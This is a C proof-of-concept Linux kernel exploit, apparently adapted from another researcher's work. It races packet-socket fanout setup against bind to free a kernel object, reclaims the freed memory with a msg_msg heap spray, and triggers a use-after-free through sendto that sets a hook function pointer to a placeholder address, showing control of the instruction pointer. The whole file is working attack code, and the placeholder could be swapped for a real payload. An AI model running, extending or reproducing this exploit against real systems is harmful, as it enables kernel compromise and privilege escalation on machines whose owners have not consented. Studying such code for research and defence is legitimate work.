/* A Proof-of-Concept demonstrating ip control, modified from ww9210's exploit
 * author: Lewis_Chen_
 */
// #define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/utsname.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sched.h>
#include <netinet/ip.h>
#include <stdint.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <unistd.h>
#include "libexp.h"

#define ETH_P_ARP   0x0806	  /* Address Resolution packet	*/
#define CRASH_IP 0xffffffffdeadbeef

#define STRUCT_LEN 3200

/*********************** Race to free *****************************/

struct sockaddr_ll {
	unsigned short  sll_family;
	short   sll_protocol; // big endian
	int sll_ifindex;
	unsigned short  sll_hatype;
	unsigned char   sll_pkttype;
	unsigned char   sll_halen;
	unsigned char   sll_addr[8];
};

static int fd;
static struct ifreq ifr;
static struct sockaddr_ll addr;
int *stage;
int *status_ptr;
int *barrier;

void *task1(void *unused) {
	status_ptr[0] = 1;
	while(*barrier == 0);

	// need race: check on po->running
	// also must be 1st or link wont register
	int fanout_val = 0x3;
	setsockopt(fd, 0x107, 18, &fanout_val, sizeof(fanout_val));
}

void *task2(void *unused) {
	status_ptr[1] = 1;
	while(*barrier == 0);

	bind(fd, (struct sockaddr *)&addr, sizeof(addr));
}

void wait_ready(void)
{
	while(status_ptr[0] == 0 || status_ptr[1] == 0);
	*barrier = 1;
}

#define IS_ERR(c, s) { if (c) perror(s); }
void loop_race() {
	int err, index;

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	IS_ERR(fd == -1, "socket");

	strcpy((char *)&ifr.ifr_name, "lo");
	err = ioctl(fd, SIOCGIFINDEX, &ifr);
	IS_ERR(err == -1, "ioctl SIOCGIFINDEX");
	index = ifr.ifr_ifindex;

	err = ioctl(fd, SIOCGIFFLAGS, &ifr);
	IS_ERR(err == -1, "ioctl SIOCGIFFLAGS");

	ifr.ifr_flags &= ~(short)IFF_UP;
	err = ioctl(fd, SIOCSIFFLAGS, &ifr);
	IS_ERR(err == -1, "ioctl SIOCSIFFLAGS");

	addr.sll_family = AF_PACKET;
	addr.sll_protocol = 0x0; // need something different to rehook && 0 to skip register_prot_hook
	addr.sll_ifindex = index;

	pthread_t thread1, thread2;
	pthread_create (&thread1, NULL, task1, NULL);
	pthread_create (&thread2, NULL, task2, NULL);
	wait_ready();
	pthread_join(thread1, NULL);
	pthread_join(thread2, NULL);

	close(fd);
}

/*********************** Heap spray *****************************/
char payload[4000];

struct msgbuf
{
	long mtype;
	char mtext[STRUCT_LEN];
};

struct msgbuf msg={0x4141414141414141,{0}};

/*********************** Exploit Payload *****************************/

/*********************** Dereference after Free *****************************/
void trigger()
{
	int fd;
	char buf[] = " ";
	umem_alloc((void *)0x20000000, 0x1000);
	fd = socket(10, 2, 0);
	*(uint16_t*)0x20000fe4 = (uint16_t)0xa;
	*(uint16_t*)0x20000fe6 = (uint16_t)0x204e;
	*(uint32_t*)0x20000fe8 = (uint32_t)0x0;
	*(uint64_t*)0x20000fec = (uint64_t)0x0;
	*(uint64_t*)0x20000ff4 = (uint64_t)0x100000000000000;
	*(uint32_t*)0x20000ffc = (uint32_t)0x0;
	sendto(fd, buf, 1, 0, (struct sockaddr *)0x20000fe4ul, 0x1c); // use
}

void setup_payload(void)
{
	memset(payload, 'A', sizeof(payload));
	*(unsigned long*)(payload+0x820) = CRASH_IP; // packet_fanout.prot_hook.func - 0x850 (48 + 0x820)
	*(unsigned long*)(payload+0x828) = CRASH_IP; // packet_fanout.prot_hook.id_match
	memcpy(msg.mtext, payload, STRUCT_LEN);

	stage = umem_alloc(NULL, 0x1000);
	barrier = stage + 1;
	status_ptr = stage + 2;
	*stage = 0;
	*barrier = 0;
}

void try_exploit(void)
{
	setup_payload();

	if(!clean_fork()) {
		setup_sandbox();
		loop_race(); // free
		*stage = 1;
		sleep(100000);// yield execution
	}
	while(*stage == 0);
	// usleep(10000);
	struct msg_spray_t *spray = msg_spray(&msg, sizeof(msg.mtext), 0x40);
	trigger(); // use
	msg_spray_clean(spray);
}

int main() {
	for(int j=0; j<1337; j++) {
		printf("%dth iteration of race\n", j);
		if(!clean_fork()) {
			try_exploit();
			exit(0);
		}
		wait(NULL);
	}

	printf("race not win, please try again\n");
	return 0;
}
